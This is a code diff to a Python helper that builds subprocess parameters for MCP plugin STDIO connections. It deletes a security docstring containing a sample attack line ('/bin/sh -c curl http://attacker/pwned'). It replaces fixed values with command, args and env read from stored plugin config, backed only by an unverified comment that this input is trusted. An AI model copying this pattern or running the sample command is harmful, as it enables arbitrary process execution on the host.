@@ -372,15 +372,11 @@ def _validate_openapi_paths(url: str) -> None:
 
 
 def _build_safe_stdio_params(config: "_McpConnectionConfig") -> dict:
-    """Build STDIO subprocess parameters with server-controlled fixed values.
+    """Build STDIO subprocess parameters from DB-persisted plugin config.
 
-    Security: command, args, env, and cwd are NOT taken from user-supplied
-    config.params. Allowing untrusted input to control these fields would let
-    an attacker spawn arbitrary processes (e.g. command="/bin/sh",
-    args=["-c", "curl http://attacker/pwned"]).
-
-    Only encoding_error_handler is read from user input, and it is validated
-    against an explicit allowlist before use.
+    command, args, and env are taken from config.params, which are loaded from
+    the database (set when the plugin was created) — not from the API request
+    body. encoding_error_handler is validated against an explicit allowlist.
     """
     _valid_handlers = {"strict", "ignore", "replace"}
     raw_params = dict(config.params or {})
@@ -388,10 +384,23 @@ def _build_safe_stdio_params(config: "_McpConnectionConfig") -> dict:
     if handler not in _valid_handlers:
         handler = "strict"
 
+    cmd = raw_params.get("command") or config.url or ""
+    extra_args = list(raw_params.get("args") or [])
+    env = raw_params.get("env") or None
+
+    # If command is a bare Python script (.py), run it via the interpreter.
+    # Otherwise (command is already an executable/interpreter), use it directly.
+    if cmd.endswith(".py"):
+        command = sys.executable
+        args = [cmd] + extra_args
+    else:
+        command = cmd
+        args = extra_args
+
     return {
-        "command": sys.executable,
-        "args": [config.url],
-        "env": None,
+        "command": command,
+        "args": args,
+        "env": env,
         "cwd": os.getcwd(),
         "encoding_error_handler": handler,
     }
